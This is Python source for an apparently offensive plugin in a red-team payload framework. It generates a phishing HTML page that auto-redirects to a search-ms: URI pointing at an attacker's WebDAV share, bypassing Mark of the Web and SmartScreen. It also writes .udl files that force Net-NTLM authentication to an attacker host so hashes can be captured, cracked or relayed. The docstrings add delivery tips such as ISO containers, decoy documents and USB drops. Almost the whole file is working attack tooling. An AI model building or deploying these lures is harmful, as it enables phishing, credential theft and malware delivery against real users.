"""
Erebus Plugin - search-ms WebDAV Trigger & UDL Net-NTLM Coercion
Author: Whispergate

search-ms WebDAV delivery:
  Generates an HTML page that triggers the Windows Search protocol handler
  (search-ms:) to open a WebDAV share in Explorer. Files on the share are
  presented without MOTW - bypassing SmartScreen on delivered payloads.

  Attack flow:
    1. HTML page with window.location = 'search-ms:query=test&crumb=location:\\\\attacker@SSL\\share'
    2. Windows Search opens Explorer showing attacker's WebDAV share
    3. User double-clicks payload - no MOTW, no SmartScreen prompt

  Infrastructure: WebDAV server on port 443 with /share path.
  Recommended: Impacket smbserver or responder WebDAV module.

UDL (Universal Data Link) Net-NTLM coercion:
  .udl files are OLE compound documents parsed by oledb32.dll.
  When opened, Windows immediately attempts to connect to the specified
  data source - including UNC paths - forcing NTLM authentication.
  Captured hashes can be cracked offline or relayed to SMB/LDAP.

  Ideal for: ISO/ZIP containers, phishing attachments, USB drops.
"""

import pathlib
import random
import string
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class SearchMsUdlPlugin(ErebusPlugin):
    """Plugin for search-ms WebDAV trigger and UDL Net-NTLM coercion."""

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="searchms_udl",
            version="1.0.0",
            author="Whispergate",
            description="search-ms WebDAV trigger and UDL Net-NTLM coercion files",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_searchms_trigger": self.create_searchms_trigger,
            "create_udl_trigger": self.create_udl_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    # ------------------------------------------------------------------ #
    # search-ms WebDAV trigger
    # ------------------------------------------------------------------ #

    def create_searchms_trigger(
        self,
        webdav_host: str,
        webdav_share: str = "share",
        webdav_ssl: bool = True,
        display_name: str = "System Update",
        output_filename: str = "document.html",
        payload_dir: Optional[pathlib.Path] = None,
        page_title: str = "Document Viewer",
        lure_heading: str = "Loading document...",
        lure_message: str = "Please wait while the document is prepared.",
        auto_redirect: bool = True,
        redirect_delay_ms: int = 2000,
    ) -> pathlib.Path:
        """
        Create an HTML page that opens a WebDAV share via search-ms: protocol.

        When opened in a browser, the page redirects to a search-ms: URI that
        instructs Windows Search / Explorer to display the WebDAV share.
        Files served from the share have no MOTW - the user can execute them
        without SmartScreen intervention.

        Args:
            webdav_host:       Attacker-controlled host (e.g. "dav.attacker.com").
                               Do not include scheme or port.
            webdav_share:      WebDAV share path after the host (default: "share").
            webdav_ssl:        Use @SSL in the UNC path (port 443, HTTPS WebDAV).
            display_name:      Friendly display name shown in Explorer title bar.
            output_filename:   HTML output filename.
            payload_dir:       Output directory.
            page_title:        Browser tab title.
            lure_heading:      Visible heading on the page.
            lure_message:      Visible body text on the page.
            auto_redirect:     Trigger search-ms redirect automatically.
            redirect_delay_ms: Milliseconds before auto-trigger fires.

        Returns:
            Path to the created HTML file.
        """
        ssl_suffix = "@SSL" if webdav_ssl else ""
        # UNC path: \\dav.host@SSL\share
        unc_path = f"\\\\\\\\{webdav_host}{ssl_suffix}\\\\{webdav_share}"

        # search-ms: URI with crumb=location pointing at WebDAV UNC
        search_ms_uri = (
            f"search-ms:query=&crumb=location:{unc_path}"
            f"&displayname={display_name}"
        )

        # JS-escaped version
        js_uri = search_ms_uri.replace("\\", "\\\\").replace('"', '\\"')

        fn_name = ''.join(random.choices(string.ascii_lowercase, k=8))

        auto_js = f"setTimeout(function(){{ {fn_name}(); }}, {redirect_delay_ms});" if auto_redirect else ""

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{page_title}</title>
<style>
  body {{
    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; margin: 0; background: #f0f2f5; color: #1a1a2e;
  }}
  .card {{
    background: #fff; border-radius: 12px; padding: 48px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
    max-width: 480px; width: 90%;
  }}
  .spinner {{
    border: 4px solid #e0e0e0; border-top: 4px solid #0078d4;
    border-radius: 50%; width: 40px; height: 40px;
    animation: spin 1s linear infinite; margin: 0 auto 24px;
  }}
  @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
  h1 {{ font-size: 1.4rem; margin-bottom: 12px; }}
  p {{ color: #555; line-height: 1.6; margin-bottom: 24px; }}
  .btn {{
    display: inline-block; padding: 12px 32px;
    background: #0078d4; color: #fff; border: none;
    border-radius: 6px; font-size: 1rem; cursor: pointer;
  }}
  .btn:hover {{ background: #106ebe; }}
</style>
</head>
<body>
<div class="card">
  <div class="spinner"></div>
  <h1>{lure_heading}</h1>
  <p>{lure_message}</p>
  <button class="btn" onclick="{fn_name}()">Open Document</button>
</div>
<script>
function {fn_name}() {{
  window.location.href = "{js_uri}";
}}
{auto_js}
</script>
</body>
</html>"""

        out_dir = pathlib.Path(payload_dir) if payload_dir else pathlib.Path(".")
        out_dir.mkdir(parents=True, exist_ok=True)
        out_path = out_dir / output_filename
        out_path.write_text(html, encoding="utf-8")
        return out_path

    # ------------------------------------------------------------------ #
    # UDL Net-NTLM coercion
    # ------------------------------------------------------------------ #

    def create_udl_trigger(
        self,
        attacker_host: str,
        share_name: str = "share",
        output_filename: str = "database.udl",
        payload_dir: Optional[pathlib.Path] = None,
        provider: str = "SQLOLEDB.1",
    ) -> pathlib.Path:
        """
        Create a Universal Data Link (.udl) file for Net-NTLM hash coercion.

        When a user double-clicks the .udl file, oledb32.dll immediately
        attempts to connect to the specified data source.  UNC paths force
        NTLM authentication - captured hashes can be cracked or relayed.

        Delivery: place in ISO/ZIP container alongside a decoy document.
        The .udl icon resembles a settings/database file; many users open
        it expecting to configure a data connection.

        Args:
            attacker_host:    Attacker-controlled SMB listener hostname/IP.
            share_name:       Share name on the attacker host.
            output_filename:  Output .udl filename.
            payload_dir:      Output directory.
            provider:         OLE DB provider string (cosmetic; not connected).

        Returns:
            Path to the created .udl file.
        """
        udl_text = (
            "[oledb]\r\n"
            "; Everything after this line is an OLE DB initstring\r\n"
            f"Provider={provider};Data Source=\\\\{attacker_host}\\{share_name};"
            "Integrated Security=SSPI;\r\n"
        )

        out_dir = pathlib.Path(payload_dir) if payload_dir else pathlib.Path(".")
        out_dir.mkdir(parents=True, exist_ok=True)
        out_path = out_dir / output_filename

        # BOM must be raw bytes (0xFF 0xFE), then body encoded as UTF-16 LE.
        # Writing "\xff\xfe" as a str then encoding with utf-16-le would expand
        # each char to 2 bytes (FF 00, FE 00) - oledb32.dll rejects that header.
        out_path.write_bytes(b"\xff\xfe" + udl_text.encode("utf-16-le"))
        return out_path


# Module-level instance for auto-discovery
_plugin = SearchMsUdlPlugin()


def validate():
    return _plugin.validate()
